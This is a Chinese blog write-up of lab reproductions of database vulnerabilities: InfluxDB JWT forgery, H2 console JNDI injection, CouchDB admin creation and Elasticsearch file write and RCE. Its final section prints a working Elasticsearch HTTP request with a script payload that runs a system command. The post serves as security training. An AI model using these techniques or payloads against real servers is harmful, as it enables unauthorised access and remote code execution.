# 原创
：  服务攻防-数据库安全-Influxdb&H2database&CouchDB&ElasticSearch数据库漏洞复现

# 服务攻防-数据库安全-Influxdb&amp;H2database&amp;CouchDB&amp;ElasticSearch数据库漏洞复现

**目录**

[一、Influxdb-未授权访问-Jwt 验证不当](#%E4%B8%80%E3%80%81%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98)

[1、Infuxdb简介](#1%E3%80%81Infuxdb%E7%AE%80%E4%BB%8B)

[2、安全问题](#2%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%89%B9%E5%AE%9A%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E)

[3、漏洞复现 ](#3%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB)

[二、H2database-未授权访问-配置不当](#%E4%BA%8C%E3%80%81%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF)

[1、H2database简介](#1%E3%80%81H2database%E7%AE%80%E4%BB%8B)

[2、安全问题](#2%E3%80%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98)

[3、漏洞复现 ](#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%C2%A0)

[三、CouchDB-权限绕过配合RCE-漏洞](#%E4%B8%89%E3%80%81Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-CVE-2012-2122%20%E5%88%A9%E7%94%A8)

[1、CouchDB简介](#1%E3%80%81CouchDB%E7%AE%80%E4%BB%8B)

[2、安全问题](#2%E3%80%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98)

[3、漏洞复现 ](#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%C2%A0)

[四 、ElasticSearch-文件写入&amp;RCE-漏洞](#%E5%9B%9B%20%E3%80%81Hadoop-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E5%86%85%E7%BD%AE%E9%85%8D%E5%90%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE)

[1、ElasticSearch简介](#1%E3%80%81ElasticSearch%E7%AE%80%E4%BB%8B)

[2、漏洞复现-1](#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1)

[3、漏洞复现-2](#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2)

[五、数据库安全总结导图](#%E5%9B%9B%20%E3%80%81Hadoop-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E5%86%85%E7%BD%AE%E9%85%8D%E5%90%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20RCE)

---


## **一、Influxdb-未授权访问-Jwt 验证不当**

### 1、Infuxdb简介

        默认端口：8086    8088。

        InfluxDB 是一个开源的时间序列数据库，旨在处理大规模数据处理和分析的高写入和查询负载。它针对实时存储和查询大量时间戳数据进行了优化。

        InfluxDB 提供了一种类似 SQL 的查询语言称为 InfluxQL，允许用户从数据库中检索和操作数据。它还支持各种客户端库和插件，以与其他数据源和工具集成。

        InfluxDB 的一些主要特点包括：

        总的来说，InfluxDB 是管理和分析时间序列数据的强大工具，在金融、医疗保健和物联网等各个行业得到广泛应用。

### 2、安全问题

        当用户开启了认证但未设置参数 shared-secret 时，InfluxDB会使用一个空字符串作为认证密钥来对JWT进行签名和验证。这种情况下，攻击者可以使用伪造的JWT来模拟任何用户身份，并在InfluxDB中执行SQL语句，这可能导致严重的安全问题。

### 3、漏洞复现 

        启动靶场环境。

        扫描环境端口，可以看到8086端口处于开启状态。

        直接在网上搜索influxdb的漏洞，就可以看到很多复现教程。

        我们打开网站并在其末尾添加下图所示内容，访问后可以看到下面的页面。

        访问下面的路径后并以post的方式上传下面的参数后会弹出一个登录框，也就是说这个操作是需要登陆后经过授权才可以执行的。

        当我们什么也不输入的时候网页会报下面的错误。

        由于其存在未授权访问漏洞，并且这个未授权访问采用的是jwt，所以可以模拟jwt来生成一个用户为admin用户，并且exp时间戳（代表着这个token的过期时间）大于当前时间的token。 

        将下面的内容在“[JSON Web Tokens - jwt.io](https://jwt.io/)”内进行加密，并且让密钥为空。

        将上面生成出来的密钥复制，然后粘贴到数据包内。

        将数据包发送出去之后可以看到成功查询到了数据。

## **二、H2database-未授权访问-配置不当 **

### 1、H2database简介

        默认端口：20051 。 

        H2database是一个开源的Java嵌入式关系型数据库管理系统（RDBMS），具有轻量级、高性能、易于使用等特点。它支持标准的SQL语言和JDBC API，可以在内存或者磁盘上存储数据，同时提供了高级特性如事务管理、索引、触发器、存储过程等。

        H2database的特点包括：

        总的来说，H2database是一个功能丰富、易于使用、高性能的Java嵌入式关系型数据库管理系统，适用于各种不同的应用场景，包括移动应用、桌面应用、Web应用等。

### 2、安全问题

        H2 database自带一个Web管理页面，可以通过浏览器来访问和管理数据库。

        在Spring开发中，如果将以下选项设置为true，则可以允许外部用户访问Web管理页面，且不进行身份验证：

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true

```

        spring.h2.console.enabled选项用于启用H2 database的Web管理页面；

        spring.h2.console.settings.web-allow-others选项用于允许外部用户访问该页面。

        如果这两个选项开启则会使得Web管理页面变得容易受到攻击，利用这个管理页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。

### 3、漏洞复现 

        启动靶场环境。

        下载 JNDI-Injection-Exploit——[https://github.com/welk1n/JNDI-Injection-Exploit.git](https://github.com/welk1n/JNDI-Injection-Exploit.git)。

---


补充：

        JNDI注入是一种攻击方式，它可以利用Java命名和目录接口（JNDI）来执行远程命令执行（RCE）攻击。攻击者可以利用JNDI注入来将恶意的JNDI对象注入到目标应用程序中，并使其在应用程序尝试使用该JNDI对象时执行恶意代码。

        在使用JNDI注入进行攻击时，可以使用一些工具来自动生成恶意JNDI对象并将其注入到目标应用程序中。其中，JNDI-Injection-Exploit是一个自动化工具，它可以利用JNDI注入漏洞执行远程命令执行攻击。

        -C - 远程class文件中要执行的命令。

        -A - 服务器地址，可以是IP地址或者域名。

---


        下载到桌面上运行后来生成JNDI链接。

        将链接复制后打开控制终端，可以看到需要进行登陆。

        先查看服务器当前的目录。

        将下图所示的两个框内的内容更改成下面的内容。

        点击“Connect”。

        再次查看服务器的目录，发现没有任何变化。

        查看监听状态发现也没有监听到任何内容。

        这是什么原因呢？

        是因为这个jar包在进行攻击的时候是远程去调用的，但是我们是在本地去监听，所以服务器上就不会有新增内容，所以需要使用一台外网的主机来对其进行监听才会成功。

        使用外网主机再次生成并监听，将其进行复制。

        再次粘贴到指定位置后，点击“Connect”。

        此时就可以看到成功监听到了内容。

        文件目录也成功多出了一个文件。

## 三、CouchDB-权限绕过配合RCE-漏洞

### 1、CouchDB简介

        默认端口：5984。 

        CouchDB是一个面向文档的NoSQL数据库，采用JSON作为文档数据格式，并使用RESTful API提供数据访问接口。以下是CouchDB的一些特点和优势：

        CouchDB适用于需要存储和处理非结构化数据的应用场景，例如Web应用、移动应用、社交网络和协同办公等。由于CouchDB具有良好的可扩展性和分布式特性，因此也适用于需要处理大规模数据和高并发请求的应用场景。

### 2、安全问题

        由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

### 3、漏洞复现 

        启动靶场环境。

        访问后可以看到下面的页面。

        抓取数据包将数据包更改成下面的样式，可以看到此时是失败的。

        将数据包再次进行修改，发送包含两个roles的数据包，即可绕过限制，可以看到这时成功了，此时就成功创建了管理员账户，账户名和密码均为“vulhub”。

        进入下面的地址，输入账号和密码后点击登陆。

        可以看到成功登陆进去了。

## 四 、ElasticSearch-文件写入&amp;RCE-漏洞

### 1、ElasticSearch简介

        默认端口：9200    9300。 

        Elasticsearch是一个基于Lucene的搜索引擎，也是一个分布式文档存储和分析引擎。以下是Elasticsearch的一些特点和优势：

        Elasticsearch适用于需要搜索、分析和处理大量数据的应用场景，例如日志分析、搜索引擎、电商网站、社交网络和物联网等。由于Elasticsearch具有良好的可扩展性和分布式特性，因此也适用于需要处理大规模数据和高并发请求的应用场景。

### 2、漏洞复现-1

        在在线靶场内找到对应环境。

        启动环境。

        9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用。

        发现9200端口存在elasticsearch页面，8080存在tomcat目录

        利用ElasticSearch写入后门至usr/local/tomcat/webapps/wwwroot/

<img alt="" height="94" src="https://img-blog.csdnimg.cn/7de4bda05923467eb30caca5bdd282f5.png" width="900"/><br/>         移动路径。

        配置。

        访问对应地址，使用参数f控制要写入的内容。

        访问对应路径，可以看到参数成功写入了。

### 3、漏洞复现-2

        在在线靶场内找到对应环境并启动。

        首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据。

        访问靶场地址后抓取数据包。

        将数据包更改成下面的样式并放包。

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

        再将数据包更改成下面的样式，放包，可以看到成功执行了对应的命令。

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

## 五、数据库安全总结导图

---


此篇文章接上篇文章：[https://blog.csdn.net/weixin_62808713/article/details/130444142](https://blog.csdn.net/weixin_62808713/article/details/130444142)

---

